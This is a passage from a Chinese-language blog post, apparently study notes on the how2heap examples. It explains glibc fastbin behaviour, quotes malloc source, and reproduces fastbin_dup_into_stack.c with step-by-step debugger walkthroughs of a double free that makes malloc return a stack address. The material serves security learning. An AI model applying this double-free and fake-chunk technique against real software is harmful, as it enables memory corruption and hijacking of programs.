p4=%p\\n\\n\"</span><span class=\"token punctuation\">,</span>p3<span class=\"token punctuation\">,</span> p4<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>执行情况：</p>\n<p>先申请一个小 chunk，释放后进入 fastbin，然后再申请一个大 chunk，将小 chunk 放入 <code>unsortedbin</code>  然后再放入对应的 <code>chunk</code>  (small chunk), 这个申请的 <code>大chunk</code>  会将前面释放的 <code>小的chunk</code>  合并，作为这个申请的大 chunk 的部分使用</p>\n<h2 id=\"2调试程序-2\"><a class=\"anchor\" href=\"#2调试程序-2\">#</a> 2. 调试程序：</h2>\n<h3 id=\"1执行完p1calloc10x40\"><a class=\"anchor\" href=\"#1执行完p1calloc10x40\">#</a> 1. 执行完 <code>p1=calloc(1,0x40)</code></h3>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/73544%5BZ0SY%288NF2QN%7BR_WPT.png\" alt=\"\" /></p>\n<h3 id=\"2执行到freep1\"><a class=\"anchor\" href=\"#2执行到freep1\">#</a> 2. 执行到 <code>free(p1);</code></h3>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/Q_%28Z%40ERFA9%7EJK__KOV%5BCC%258.png\" alt=\"\" /></p>\n<h3 id=\"3执行到p3-malloc0x400\"><a class=\"anchor\" href=\"#3执行到p3-malloc0x400\">#</a> 3. 执行到 <code>p3 = malloc(0x400);</code></h3>\n<p>从下面的图里可以发现</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/R2FD%28J2%40%5BCZI%5DH%5B%5DY5%24%7ETU0.png\" alt=\"\" /></p>\n<p>p1 被合并了，这是因为 p1 紧紧挨着 <code>top chunk</code> ，导致申请一个 <code>large_bin</code>  会执行 <code>malloc_consolidate (av);</code></p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/TF95HBY0%40_XHZ3%29K2IP%24%2988.png\" alt=\"\" /></p>\n<p>这样会将 fastbin 进行变动，紧挨着 top chunk 就会与 top chunk 合并，不紧挨着就会进入 unsorted 再判断进入 <code>small_bin</code>  还是 <code>large_bin</code> ，因此 p1 的 chunk 就与 <code>top chunk</code>  合并，接着就被 p3 给申请了（ <code>p3 = malloc(0x400)</code> ），所以 p3 与 p1 指针是同一个地址（因此能够顺利通过 22 行 <code>assert(p1 == p3);</code>  的判断），就将 p1 的 chunk 覆盖了</p>\n<h3 id=\"4执行到25行freep1\"><a class=\"anchor\" href=\"#4执行到25行freep1\">#</a> 4. 执行到 25 行 <code>free(p1);</code></h3>\n<p>可以发现原本应该是 p3 的 chunk，通过释放 p1 也释放了，因为 <code>p1=p3</code> , 最终就回归了 <code>top chunk</code></p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/J%29%60HJ4KDX74RPGUHV%7D1W7YC.png\" alt=\"\" /></p>\n<h3 id=\"5执行到27行p4-malloc0x400\"><a class=\"anchor\" href=\"#5执行到27行p4-malloc0x400\">#</a> 5. 执行到 27 行 <code>p4 = malloc(0x400)</code></h3>\n<p>注意这里是 <code>p4</code> , 这里接着从 <code>top chunk</code>  申请一个 <code>large chunk</code> ，可以发现仍然占用的是前面 p1 和 p3 的位置</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/%40_RS40J9IDU6CZA02R%7E%7D93W.png\" alt=\"\" /></p>\n<h3 id=\"6程序运行结束\"><a class=\"anchor\" href=\"#6程序运行结束\">#</a> 6. 程序运行结束</h3>\n<p>最后运行结果也展示了 p1、p3 和 p4 的地址都是同一个，也证明了即使释放（free）后，没有将指针置空就导致会被复用，导致可以通过其他的指针对一个 chunk 进行修改，</p>\n<h1 id=\"3fastbin_dup_into_stackc\"><a class=\"anchor\" href=\"#3fastbin_dup_into_stackc\">#</a> 3. <code>fastbin_dup_into_stack.c</code></h1>\n<p>该例子通过在栈上找到（伪造）一个合适的 size 来，然后通过 double free 来进行修改 chunk 的 fd，最后就能够申请到这个栈空间作为 chunk，从而对栈进入任意的修改</p>\n<p>这里为什么 fastbin 只要构造一个 size 就可以伪造成功，这里根据源码可以知道 (3368 行)：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span>nb<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span><span class=\"token function\">get_max_fast</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\">// 这里是申请对 fastbin 申请 chunk</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>      idx <span class=\"token operator\">=</span> <span class=\"token function\">fastbin_index</span> <span class=\"token punctuation\">(</span>nb<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>      mfastbinptr <span class=\"token operator\">*</span>fb <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span><span class=\"token function\">fastbin</span> <span class=\"token punctuation\">(</span>av<span class=\"token punctuation\">,</span> idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>      mchunkptr pp <span class=\"token operator\">=</span> <span class=\"token operator\">*</span>fb<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>      <span class=\"token keyword\">do</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>          victim <span class=\"token operator\">=</span> pp<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>          <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>victim <span class=\"token operator\">==</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>      <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>pp <span class=\"token operator\">=</span> <span class=\"token function\">catomic_compare_and_exchange_val_acq</span> <span class=\"token punctuation\">(</span>fb<span class=\"token punctuation\">,</span> victim<span class=\"token operator\">-></span>fd<span class=\"token punctuation\">,</span> victim<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>             <span class=\"token operator\">!=</span> victim<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>victim <span class=\"token operator\">!=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token punctuation\">&#123;</span>     <span class=\"token comment\">// 检测链表的 size 是否合法</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>          <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">__builtin_expect</span> <span class=\"token punctuation\">(</span><span class=\"token function\">fastbin_index</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chunksize</span> <span class=\"token punctuation\">(</span>victim<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> idx<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            <span class=\"token punctuation\">&#123;</span> <span class=\"token comment\">// 不合法</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>              errstr <span class=\"token operator\">=</span> <span class=\"token string\">\"malloc(): memory corruption (fast)\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>            errout<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>              <span class=\"token function\">malloc_printerr</span> <span class=\"token punctuation\">(</span>check_action<span class=\"token punctuation\">,</span> errstr<span class=\"token punctuation\">,</span> <span class=\"token function\">chunk2mem</span> <span class=\"token punctuation\">(</span>victim<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> av<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>              <span class=\"token keyword\">return</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span> <span class=\"token comment\">// 合法得到符合的返回</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>          <span class=\"token function\">check_remalloced_chunk</span> <span class=\"token punctuation\">(</span>av<span class=\"token punctuation\">,</span> victim<span class=\"token punctuation\">,</span> nb<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>          <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>p <span class=\"token operator\">=</span> <span class=\"token function\">chunk2mem</span> <span class=\"token punctuation\">(</span>victim<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>          <span class=\"token function\">alloc_perturb</span> <span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> bytes<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>          <span class=\"token keyword\">return</span> p<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>fastbin 中检查机制比较少，而且 fastbin 作为单链表结构，同一链表中的元素由 fd 指针来进行维护。同时 fastbin 不会对 size 域的后三位进行检查</p>\n<h2 id=\"1程序源码\"><a class=\"anchor\" href=\"#1程序源码\">#</a> 1. 程序源码：</h2>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"This file extends on fastbin_dup.c by tricking malloc into\\n\"</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t       <span class=\"token string\">\"returning a pointer to a controlled location (in this case, the stack).\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> <span class=\"token keyword\">long</span> stack_var<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"The address we want malloc() to return is %p.\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>stack_var<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Allocating 3 buffers.\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t<span class=\"token keyword\">int</span> <span class=\"token operator\">*</span>a <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t<span class=\"token keyword\">int</span> <span class=\"token operator\">*</span>b <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t<span class=\"token keyword\">int</span> <span class=\"token operator\">*</span>c <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"1st malloc(8): %p\\n\"</span><span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"2nd malloc(8): %p\\n\"</span><span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"3rd malloc(8): %p\\n\"</span><span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Freeing the first one...\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t<span class=\"token function\">free</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"If we free %p again, things will crash because %p is at the top of the free list.\\n\"</span><span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\t<span class=\"token comment\">// free(a);</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"So, instead, we'll free %p.\\n\"</span><span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>\t<span class=\"token function\">free</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Now, we can free %p again, since it's not the head of the free list.\\n\"</span><span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>\t<span class=\"token function\">free</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Now the free list has [ %p, %p, %p ]. \"</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>\t\t<span class=\"token string\">\"We'll now carry out our attack by modifying data at %p.\\n\"</span><span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>\t<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> <span class=\"token keyword\">long</span> <span class=\"token operator\">*</span>d <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"1st malloc(8): %p\\n\"</span><span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"2nd malloc(8): %p\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Now the free list has [ %p ].\\n\"</span><span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Now, we have access to %p while it remains at the head of the free list.\\n\"</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>\t\t<span class=\"token string\">\"so now we are writing a fake free size (in this case, 0x20) to the stack,\\n\"</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>\t\t<span class=\"token string\">\"so that malloc will think there is a free chunk there and agree to\\n\"</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>\t\t<span class=\"token string\">\"return a pointer to it.\\n\"</span><span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>\tstack_var <span class=\"token operator\">=</span> <span class=\"token number\">0x20</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\\n\"</span><span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>\t<span class=\"token operator\">*</span>d <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> <span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>stack_var<span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"3rd malloc(8): %p, putting the stack address on the free list\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"4th malloc(8): %p\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>初步看源码大概了解了程序的运行，不过对于 48 行的 sizeof (d) 存有疑问，大小是多少 (这里应该是一个指针的大小即 8 字节)，这里是将 d 的地址直接改为了 fake_chunk 的地址（也就是改了 a 的地址），但是在 fastbin 链表的 fd 指针的值也被这种方式修改了吗</p>\n<p>后面反应过来，malloc 返回的指针是数据段的位置而不是 <code>pre_size</code> ，所以直接修改 <code>*d</code>  等于修改的是对应 chunk 的 fd（修改的是 * d 指向地址内的值）</p>\n<h2 id=\"2调试程序-3\"><a class=\"anchor\" href=\"#2调试程序-3\">#</a> 2. 调试程序：</h2>\n<h3 id=\"1执行第9行unsigned-long-long-stack_var\"><a class=\"anchor\" href=\"#1执行第9行unsigned-long-long-stack_var\">#</a> 1. 执行第 9 行 <code>unsigned long long stack_var;</code></h3>\n<p>查看此处定义的栈参数的地址</p>\n<p>这个栈地址是 <code>0x7fffffffdcb0</code></p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/ctfshow/TBOELRRCM4%29OHKJVBGD8IU9.png\" alt=\"\" /></p>\n<h3 id=\"2执行到第17行\"><a class=\"anchor\" href=\"#2执行到第17行\">#</a> 2. 执行到第 17 行</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token operator\">*</span>a <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token operator\">*</span>b <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token operator\">*</span>c <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>申请了 3 个 chunk，查看堆情况</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/ctfshow/%5DM2OFN3A%29%60%40%60PMHMA%40QTV_N.png\" alt=\"\" /></p>\n<h3 id=\"3执行23行freea\"><a class=\"anchor\" href=\"#3执行23行freea\">#</a> 3. 执行 23 行 <code>free(a)</code></h3>\n<p>查看堆，a 已经进入了 <code>fastbin</code></p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/ctfshow/%7EDGKT%7DW%25DAJ%5D%5B%607OJ%7E5%60%7EZU.png\" alt=\"\" /></p>\n<h3 id=\"4执行29行freeb\"><a class=\"anchor\" href=\"#4执行29行freeb\">#</a> 4. 执行 29 行 <code>free(b)</code></h3>\n<p>释放 b 是为了绕过检测，使 chunk a 不是于 fastbin 直接相连的 chunk，这样第二次释放就不会被检测出来</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/ctfshow/YF%40%7DLVK%29C6MQKL%40V%40N%25%7DL%5D2.png\" alt=\"\" /></p>\n<h3 id=\"5执行32行freea\"><a class=\"anchor\" href=\"#5执行32行freea\">#</a> 5. 执行 32 行 <code>free(a)</code></h3>\n<p>对 a 进行再次释放（ <code>double free</code> ）</p>\n<p>在 fastbin 中已经变成了  <code>fastbin-&gt;chunk a-&gt;chunk b-&gt;chunk a</code></p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/ctfshow/U0U12EX%25JZMM%5BPSBK4B_4Z6.png\" alt=\"\" /></p>\n<h3 id=\"6执行36行unsigned-long-long-d-malloc8\"><a class=\"anchor\" href=\"#6执行36行unsigned-long-long-d-malloc8\">#</a> 6. 执行 36 行 <code>unsigned long long *d = malloc(8);</code></h3>\n<p>此时 d 申请的 chunk 会是 chunk a，此时 <code>*d=*a</code></p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/ctfshow/IK6Q%25I951SIM9%7E_R0X%7EG4%24N.png\" alt=\"\" /></p>\n<p>打印指针 d (发现是是 <code>chunk a</code>  的 fd 位置的地址)</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/ctfshow/%29Y%40H5NSC0YX%28%5B_L%29%5BAT5HB3.png\" alt=\"\" /></p>\n<h3 id=\"7执行39行malloc8\"><a class=\"anchor\" href=\"#7执行39行malloc8\">#</a> 7. 执行 39 行 <code>malloc(8)</code></h3>\n<p>此时剩下的 <code>chunk a</code>  是第一次释放的（不是第二次释放的）</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/ctfshow/T9JQ%25TA%402DSNPCY%28Q%7DXEQ%25W.png\" alt=\"\" /></p>\n<h3 id=\"8执行45行stack_var-0x20\"><a class=\"anchor\" href=\"#8执行45行stack_var-0x20\">#</a> 8. 执行 45 行 <code>\tstack_var = 0x20;</code></h3>\n<p>改变栈的值 = 0x20，为了构造 <code>fake_chunk</code> ，因为这里要作为 fake_chunk 的 size 位，那么我们就需要 <code>fastbin</code>  中的 <code>chunk</code>  的 fd 指向 <code>pre_size</code>  的位置，也就是 <code>&amp;stack_var-8</code></p>\n<p>查看 stack_var 的地址 <code>0x7fffffffdcb0</code>  ，所以要将其 <code>0x7fffffffdca8</code>  作为 <code>chunk a </code> 的 fd 位的值</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/ctfshow/9JTX0QQF9G%7E%7BP%40%5B2AN5%7EJ%29D.png\" alt=\"\" /></p>\n<h3 id=\"9执行48行d-unsigned-long-long-charstack_var-sizeofd\"><a class=\"anchor\" href=\"#9执行48行d-unsigned-long-long-charstack_var-sizeofd\">#</a> 9. 执行 48 行 <code>*d = (unsigned long long) (((char*)&amp;stack_var) - sizeof(d));</code></h3>\n<p>这里修改了 d 指针内存放的值，改为了 <code>stack_var地址-0x8</code> ，（sizeof (d) 计算指针的大小为 8 字节）</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/ctfshow/%5DV00%5D5856NVLE%5B6%7D2ORVU4P.png\" alt=\"\" 